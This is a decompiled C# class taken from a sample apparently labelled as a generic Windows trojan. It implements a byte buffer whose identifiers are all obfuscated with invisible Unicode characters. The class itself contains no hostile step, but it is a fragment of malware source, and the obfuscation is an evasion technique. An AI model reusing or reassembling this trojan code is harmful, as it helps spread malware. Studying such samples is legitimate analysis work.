// Decompiled with JetBrains decompiler
// Type: ‪‫⁯⁪⁮⁯‮⁮⁭⁭‬⁯‫‭‌⁮⁭‫‬​‮⁫‌⁫‬‍‏‪‪⁭⁯​‏‬‭‌‏⁭⁪‎‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;
using System.IO;

public sealed class \u202A‫⁯⁪⁮⁯‮⁮⁭⁭‬⁯‫‭‌⁮⁭‫‬​‮⁫‌⁫‬‍‏‪‪⁭⁯​‏‬‭‌‏⁭⁪‎‮
{
  private byte[] \u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮;
  private int \u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮;
  private int \u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮;
  private bool \u200D⁭⁫​⁫‎‌‎‍‭⁬‫‫‪​⁯‍‍‬‭‬⁯⁭‪⁯‎‏⁪‫‮‬⁮‬‮⁬‌⁫‏​‮‮;

  public static int \u202B⁬⁭‌‌‎⁭‬⁪‪‍‮⁬‍‏‍⁭‌⁮⁮‭‭‪‪‭‬‪‎‫⁫‬‬‫‬⁫‬⁪‭‏‫‮(int _param0)
  {
    _param0 |= _param0 >> 1;
    _param0 |= _param0 >> 2;
    _param0 |= _param0 >> 4;
    _param0 |= _param0 >> 8;
    _param0 |= _param0 >> 16;
    return _param0 + 1;
  }

  public \u202A‫⁯⁪⁮⁯‮⁮⁭⁭‬⁯‫‭‌⁮⁭‫‬​‮⁫‌⁫‬‍‏‪‪⁭⁯​‏‬‭‌‏⁭⁪‎‮()
    : this(0)
  {
  }

  public \u202A‫⁯⁪⁮⁯‮⁮⁭⁭‬⁯‫‭‌⁮⁭‫‬​‮⁫‌⁫‬‍‏‪‪⁭⁯​‏‬‭‌‏⁭⁪‎‮(int _param1) => this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮ = _param1 == 0 ? \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u202B⁫‌⁮⁫‎‬‮⁭‪⁬⁭‌⁯‏‬‮​‪‎⁫‍⁪‭‫​‌⁫⁫⁯‏⁫⁫⁭‌‫⁫‫‪‎‮ : new byte[_param1];

  public \u202A‫⁯⁪⁮⁯‮⁮⁭⁭‬⁯‫‭‌⁮⁭‫‬​‮⁫‌⁫‬‍‏‪‪⁭⁯​‏‬‭‌‏⁭⁪‎‮(byte[] _param1, int _param2, int _param3)
  {
    this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮ = _param1;
    this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ = _param2;
    this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ = _param3;
    this.\u200D⁭⁫​⁫‎‌‎‍‭⁬‫‫‪​⁯‍‍‬‭‬⁯⁭‪⁯‎‏⁪‫‮‬⁮‬‮⁬‌⁫‏​‮‮ = true;
  }

  public void \u200C‏⁮‬​⁪‏‫⁪‍‭⁭⁫‌⁫​‫‍⁮‫‏⁬‪⁮⁪‬⁫‌‍‎⁭‏⁬‍‫⁯‮‎‮⁮‮(
    byte[] _param1,
    int _param2,
    int _param3)
  {
    if (this.\u200D⁭⁫​⁫‎‌‎‍‭⁬‫‫‪​⁯‍‍‬‭‬⁯⁭‪⁯‎‏⁪‫‮‬⁮‬‮⁬‌⁫‏​‮‮)
      throw new InvalidOperationException("Cannot add data to read-only buffer");
    if (this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ + this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ + _param3 > this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮.Length)
    {
      int length = \u202A‫⁯⁪⁮⁯‮⁮⁭⁭‬⁯‫‭‌⁮⁭‫‬​‮⁫‌⁫‬‍‏‪‪⁭⁯​‏‬‭‌‏⁭⁪‎‮.\u202B⁬⁭‌‌‎⁭‬⁪‪‍‮⁬‍‏‍⁭‌⁮⁮‭‭‪‪‭‬‪‎‫⁫‬‬‫‬⁫‬⁪‭‏‫‮(this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ + _param3);
      if (length > this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮.Length)
      {
        byte[] destinationArray = new byte[length];
        Array.Copy((Array) this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮, (Array) destinationArray, 0, this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮);
        this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮ = destinationArray;
      }
      else
        Array.Copy((Array) this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮, (Array) this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, 0, this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮);
      this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ = 0;
    }
    Array.Copy((Array) _param1, _param2, (Array) this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ + this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮, _param3);
    this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ += _param3;
  }

  public int \u200B⁭⁫‌⁭⁯⁮⁯⁮⁬‌‬‏‬⁮‍‬⁬‭‎⁫‍‮‮⁪‫⁫⁯‮‪⁯‭‎‬⁪‮‮‍⁫‫‮ => this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮;

  public void \u202D‪‪‌‌⁭‎‪‎‏⁯⁬‌⁮⁯⁬‭‪‪⁭⁯‬‬‎‌‎⁮‪‌‭⁭‪‭⁬⁪⁭⁭‍‫⁪‮(Stream _param1, int _param2)
  {
    if (_param2 > this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮)
      throw new InvalidOperationException("Cannot copy " + _param2.ToString() + " bytes, only got " + this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮.ToString());
    _param1.Write(this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮, _param2);
  }

  public void \u202E‮‍‎‎‍‍⁪‎‭⁭‭‫‏‮​‬‏‌‭⁭⁮⁪⁫‏⁪⁬‏‮‮‭‎⁮‎‭⁯‍⁪⁯‮‮(
    byte[] _param1,
    int _param2,
    int _param3,
    int _param4)
  {
    if (_param1.Length - _param2 < _param3)
      throw new ArgumentException("Buffer size of " + _param1.Length.ToString() + " is too small for a read of " + _param3.ToString() + " bytes");
    if (this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ - _param4 < _param3)
      throw new InvalidOperationException("Not enough data to read");
    Array.Copy((Array) this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ + _param4, (Array) _param1, _param2, _param3);
  }

  internal \u206B‏‮‪‍‪⁭‮⁯⁪‪⁮⁮⁮‏⁪‍‮⁭‫⁫‎‪⁮‬⁯‬‮⁬‎⁫​⁬‭⁪⁯⁫‏‫‍‮ \u202C‪‪⁯⁪‍⁪‌‬‬⁯‍⁪⁮‮‍‌‌​‬‌⁯⁯‌⁫⁮⁪‪⁫‬‪⁯⁪⁬​‬‫‮⁪‮‮(
    int _param1)
  {
    if (_param1 > this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮)
      throw new InvalidOperationException("Cannot read " + _param1.ToString() + " bytes, only got " + this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮.ToString());
    int num = this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮;
    this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ -= _param1;
    this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ += _param1;
    return new \u206B‏‮‪‍‪⁭‮⁯⁪‪⁮⁮⁮‏⁪‍‮⁭‫⁫‎‪⁮‬⁯‬‮⁬‎⁫​⁬‭⁪⁯⁫‏‫‍‮(this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, num, _param1);
  }

  public int \u206F⁪⁮‪⁬⁬⁯‌‮‫⁪⁭‏‏⁪⁫⁫⁬‭⁪‎‎​​​‫‫‮‏⁭​⁫​‮‏‍‮⁫‎‎‮()
  {
    if (this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ < 4)
      throw new InvalidOperationException("Not enough data to read");
    return \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u206F⁪⁮‪⁬⁬⁯‌‮‫⁪⁭‏‏⁪⁫⁫⁬‭⁪‎‎​​​‫‫‮‏⁭​⁫​‮‏‍‮⁫‎‎‮(this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮);
  }

  public void \u202D‫‍⁬⁫​‎‮​⁭‪‮‎‬‫⁪‭⁯⁭⁫‬‎‍⁫​‍‮⁫‌⁬‫‭⁬⁮‬⁯⁫⁬‏⁬‮(int _param1)
  {
    if (_param1 > this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮)
      throw new InvalidOperationException("Cannot remove " + _param1.ToString() + " bytes, only got " + this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮.ToString());
    this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ -= _param1;
    this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ += _param1;
  }

  public void \u202D‫‍⁬⁫​‎‮​⁭‪‮‎‬‫⁪‭⁯⁭⁫‬‎‍⁫​‍‮⁫‌⁬‫‭⁬⁮‬⁯⁫⁬‏⁬‮(
    byte[] _param1,
    int _param2,
    int _param3,
    int _param4)
  {
    this.\u202E‮‍‎‎‍‍⁪‎‭⁭‭‫‏‮​‬‏‌‭⁭⁮⁪⁫‏⁪⁬‏‮‮‭‎⁮‎‭⁯‍⁪⁯‮‮(_param1, _param2, _param3, _param4);
    this.\u202D‫‍⁬⁫​‎‮​⁭‪‮‎‬‫⁪‭⁯⁭⁫‬‎‍⁫​‍‮⁫‌⁬‫‭⁬⁮‬⁯⁫⁬‏⁬‮(_param4 + _param3);
  }

  public byte[] \u202D‫‍⁬⁫​‎‮​⁭‪‮‎‬‫⁪‭⁯⁭⁫‬‎‍⁫​‍‮⁫‌⁬‫‭⁬⁮‬⁯⁫⁬‏⁬‮(int _param1, int _param2)
  {
    byte[] numArray = new byte[_param1];
    this.\u202D‫‍⁬⁫​‎‮​⁭‪‮‎‬‫⁪‭⁯⁭⁫‬‎‍⁫​‍‮⁫‌⁬‫‭⁬⁮‬⁯⁫⁬‏⁬‮(numArray, 0, _param1, _param2);
    return numArray;
  }

  public void \u200D‮​‏⁬‏‏‪‮‬⁬⁯‎​⁪‮⁪​‭⁪​‍‏⁭⁭‭⁫⁬⁫⁭⁫​‪⁬⁫‌‬‍‏‍‮()
  {
    if (this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮ == 0)
    {
      this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮ = \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u202B⁫‌⁮⁫‎‬‮⁭‪⁬⁭‌⁯‏‬‮​‪‎⁫‍⁪‭‫​‌⁫⁫⁯‏⁫⁫⁭‌‫⁫‫‪‎‮;
      this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ = 0;
    }
    else
    {
      int length = \u202A‫⁯⁪⁮⁯‮⁮⁭⁭‬⁯‫‭‌⁮⁭‫‬​‮⁫‌⁫‬‍‏‪‪⁭⁯​‏‬‭‌‏⁭⁪‎‮.\u202B⁬⁭‌‌‎⁭‬⁪‪‍‮⁬‍‏‍⁭‌⁮⁮‭‭‪‪‭‬‪‎‫⁫‬‬‫‬⁫‬⁪‭‏‫‮(this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮);
      if (length >= this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮.Length)
        return;
      byte[] destinationArray = new byte[length];
      Array.Copy((Array) this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮, this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮, (Array) destinationArray, 0, this.\u200D⁬⁪⁬⁫⁭⁯‮‭‭‎‭⁯‪‫⁯​⁪‏‌‏⁮⁪⁫‭‫‎‏‪‫⁯⁫‫‌⁯⁯‬‏‮);
      this.\u202C⁯‌‪‍‭​‍‫⁮⁫⁯‪‭⁫‍⁮‌‏‬‏‎⁪⁮‪‭⁫⁫⁭‮⁮‬⁯​⁯‫⁫‬⁮‏‮ = destinationArray;
      this.\u202C‬‫⁫‪‏‮⁪⁫​‌⁮⁪‏⁭‏​⁫‌⁮⁪​‎‬‏‪‭⁫‮⁪⁫‌‪‮‫​⁪‭‍⁯‮ = 0;
    }
  }
}
